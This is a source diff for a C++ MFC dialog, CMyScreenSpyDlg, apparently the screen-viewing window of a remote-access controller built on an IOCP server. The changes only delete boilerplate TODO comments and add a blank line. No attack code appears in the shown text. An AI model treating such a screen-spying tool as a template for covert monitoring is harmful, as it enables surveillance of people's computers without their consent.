@@ -81,7 +81,6 @@ CMyScreenSpyDlg::CMyScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, Client
 
 void CMyScreenSpyDlg::OnClose()
 {
-	// TODO: Add your message handler code here and/or call default
 	m_pContext->m_Dialog[0] = 0;
 
 	closesocket(m_pContext->m_Socket);
@@ -408,6 +407,7 @@ void CMyScreenSpyDlg::DrawNextScreenDiff()
 
 	if (bIsReDraw) OnPaint();
 }
+
 void CMyScreenSpyDlg::DrawNextScreenRect()
 {
 	// 根据鼠标是否移动和鼠标是否在变化的区域判断是否重绘鼠标，防止鼠标闪烁
@@ -674,7 +674,6 @@ BOOL CMyScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
 
 void CMyScreenSpyDlg::PostNcDestroy()
 {
-	// TODO: Add your specialized code here and/or call the base class
 	delete this;
 	CDialogEx::PostNcDestroy();
 }
@@ -694,8 +693,6 @@ void CMyScreenSpyDlg::SendCommand(MSG* pMsg)
 
 void CMyScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
 {
-	// TODO: Add your message handler code here and/or call default
-
 	SCROLLINFO si;
 	int	i;
 	si.cbSize = sizeof(SCROLLINFO);
